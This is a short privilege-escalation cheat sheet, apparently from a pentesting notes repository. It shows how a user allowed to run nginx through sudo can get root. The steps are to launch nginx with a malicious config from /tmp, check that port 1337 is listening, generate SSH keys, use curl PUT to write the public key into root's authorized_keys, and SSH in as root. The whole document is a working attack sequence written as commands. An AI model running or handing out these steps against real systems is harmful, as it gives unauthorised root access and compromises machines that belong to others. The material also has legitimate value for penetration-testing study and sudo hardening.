# Nginx Privilege Escalation

## Sudo:

 - sudo -l (Check if the user runs nginx via sudo)

### Then create a malicious config file to configure with nginx (Check rootshells folder in this repo)

 - sudo nginx -c /tmp/malicious.conf

### In this example, we try to connect to root via ssh by creating our own keys

 - ss -tulpn (Check if the configuration file ran successfully. Check for port 1337 in this example)

 - ssh-keygen (Save the key to ./root to work successfully)

 - curl -X PUT localhost:1337/root/.ssh/authorized_keys -d "$(cat root.pub)" (Put the newly created public key to the "authorized_keys" file of the root user to recognize our keys)

 - ssh -i root root@localhost (SSH to root with the newly created key)
